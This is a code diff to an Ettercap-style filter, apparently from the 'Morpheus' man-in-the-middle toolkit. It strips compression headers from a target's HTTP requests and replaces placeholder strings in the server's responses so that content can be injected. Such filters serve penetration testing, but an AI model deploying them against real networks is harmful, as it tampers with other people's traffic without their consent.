@@ -12,7 +12,7 @@
 
 
 ##
-#  This filter will replace certain words in tcp packet
+#  This filter will replace certain words In tcp packet
 #  requests befor forward the packet back to target host.
 ##
 
@@ -24,30 +24,23 @@
 ##########################
 # change target request to server
 if (ip.dst == 'IpAdDR' && ip.proto == TCP && tcp.dst == 80) {
+  if (search(DATA.data, "Accept-Encoding")) {
+    replace("Accept-Encoding", "Accept-Rubbishe");
+    msg("\n[morpheus] host:IpAdDR   [ ⊶  ]  found ☆");
+    msg("[Morpheus] |_ packet Accept-Encoding zapped ✔\n");
+  }
+}
+
+if (ip.dst == 'IpAdDR' && ip.proto == TCP && tcp.dst == 80) {
   msg("[morpheus] host:IpAdDR   [ <- ]  port:80 http ☆");
-  msg("[Morpheus] | status: replacing packet content!");
   if (search(DATA.data, "gzip")) {
     replace("gzip", "    "); # note: four spaces In the replacement string
-    msg("[Morpheus] |  packet string gzip zapped ✔");
   }
 }
 
 if (ip.dst == 'IpAdDR' && ip.proto == TCP && tcp.dst == 80) {
   if (search(DATA.data, "deflate")) {
     replace("deflate", "       "); # note: seven spaces In the replacement string
-    msg("[Morpheus] |  packet string deflate zapped ✔");
-  }
-}
-
-if (ip.dst == 'IpAdDR' && ip.proto == TCP && tcp.dst == 80) {
-  if (search(DATA.data, "Accept-Encoding")) {
-    replace("Accept-Encoding", "Accept-Rubbish!");
-    msg("[Morpheus] |  packet Accept-Encoding zapped ✔");
-  }else{
-  if (search(DECODED.data, "Accept-Encoding")) {
-    replace("Accept-Encoding", "Accept-Rubbish!");
-    msg("[Morpheus] |  packet Accept-Encoding zapped ✔");
-  }
   }
 }
 
@@ -59,11 +52,11 @@ if (ip.dst == 'IpAdDR' && ip.proto == TCP && tcp.dst == 80) {
 #####################
 # change server response to target
 if (ip.dst == 'IpAdDR' && ip.proto == TCP && tcp.src == 80) {
-  if search(DATA.data, "RePlAcE")){
-    # note: since we are replacing webpage body letters its advice 'for'
-    # the replacement string to have the same length of the injected one.
+  if (search(DATA.data, "RePlAcE")){
     replace("RePlAcE", "InJeC");
-    msg("[morpheus] |_ packet forward back to target ✔\n");
+    msg("\n[morpheus] host:IpAdDR   [ ⊶  ]  found ☆");
+    msg("[morpheus] | status : string found in tcp packet ✔");
+    msg("[morpheus] |_info   : packet forward back to target ✔\n");
   }
 }
 
